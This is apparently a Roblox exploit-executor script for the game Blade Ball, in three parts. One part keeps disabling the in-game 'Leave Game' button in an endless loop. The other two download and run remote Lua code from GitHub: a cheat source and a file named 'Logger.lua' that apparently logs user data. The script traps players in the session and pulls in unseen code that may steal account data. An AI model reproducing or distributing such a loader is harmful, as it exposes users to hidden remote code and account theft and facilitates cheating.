-- Script 1
task.spawn(function()
    while task.wait() do
        pcall(function()
            for _, v in ipairs(getconnections(
                game:GetService("CoreGui")
                    .RobloxGui.SettingsClippingShield.SettingsShield.MenuContainer.Page.PageViewClipper.PageView.PageViewInnerFrame.LeaveGamePage.LeaveButtonsContainer.LeaveButtonsContainer.LeaveGameButton.Activated
            )) do
                v:Disable()
            end
        end)
    end
end)

-- Script 2
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cxzyue/Blade-Ball/refs/heads/main/SilogX%20Source.lua"))()
end)

-- Script 3
task.spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/cxzyue/Blade-Ball/refs/heads/main/Logger.lua"))()
end)
